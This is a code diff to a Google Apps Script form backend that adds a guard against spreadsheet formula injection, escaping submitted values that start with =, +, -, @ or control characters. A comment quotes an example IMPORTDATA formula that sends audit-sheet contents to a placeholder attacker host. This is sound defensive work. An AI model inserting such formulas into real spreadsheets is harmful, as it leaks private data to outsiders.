@@ -42,6 +42,22 @@ const AUDIT_ONLY = ['modReason', 'modStatus'];
 // 標記資料來源：'form' = 真投稿、'mock' = seed.gs 灌的測試資料（見 seed.gs）
 const DATA_SOURCE_COLUMN = 'dataSource';
 
+/**
+ * 防 Google Sheets 公式注入。
+ *
+ * appendRow() 會把 "=" 開頭的字串當公式執行，投稿者因此可以填
+ *   =IMPORTDATA("https://evil.tld/?x="&audit!G2)
+ * 讓試算表被打開時，由 Google 伺服器把 audit 分頁（含被屏蔽的短評原文、
+ * AI 審稿理由）送到外部主機。IMAGE()／HYPERLINK() 同理。
+ *
+ * 對策：凡是以 = + - @ 或前導 Tab/換行 開頭者，前面補一個單引號強制當純文字。
+ * 單引號不會顯示、也不會進發布的 CSV，對前端完全無感。
+ */
+function safeCell_(v) {
+  var s = (v === undefined || v === null) ? '' : String(v);
+  return /^[=+\-@\t\r\n]/.test(s) ? "'" + s : s;
+}
+
 function doPost(e) {
   try {
     const p = (e && e.parameter) || {};
@@ -76,13 +92,13 @@ function writeSubmission_(p) {
   const missing = publicKeys.concat([DATA_SOURCE_COLUMN])
     .filter(function (k) { return header.indexOf(k) === -1; });
   if (missing.length) {
-    sh.getRange(1, header.length + 1, 1, missing.length).setValues([missing]);
+    sh.getRange(1, header.length + 1, 1, missing.length).setValues([missing.map(safeCell_)]);
     header = header.concat(missing);
   }
   sh.appendRow(header.map(function (h) {
     if (h === 'timestamp') return ts;
     if (h === DATA_SOURCE_COLUMN) return 'form';   // 'mock' = seed.gs 灌的測試資料
-    return p[h] !== undefined ? p[h] : '';
+    return p[h] !== undefined ? safeCell_(p[h]) : '';
   }));
 
   // ② 稽核分頁：AI 審稿理由原文（勿發布）
@@ -90,8 +106,8 @@ function writeSubmission_(p) {
   if (audit.getLastRow() === 0) {
     audit.appendRow(['timestamp', 'category', 'modVerdict', 'modCode', 'modStatus', 'modReason', 'comment']);
   }
-  audit.appendRow([ts, slug, p.modVerdict || '', p.modCode || '',
-                   p.modStatus || '', p.modReason || '', p.comment || '']);
+  audit.appendRow([ts, slug, safeCell_(p.modVerdict), safeCell_(p.modCode),
+                   safeCell_(p.modStatus), safeCell_(p.modReason), safeCell_(p.comment)]);
 
   return { ok: true, sheet: 'sub_' + slug };
 }
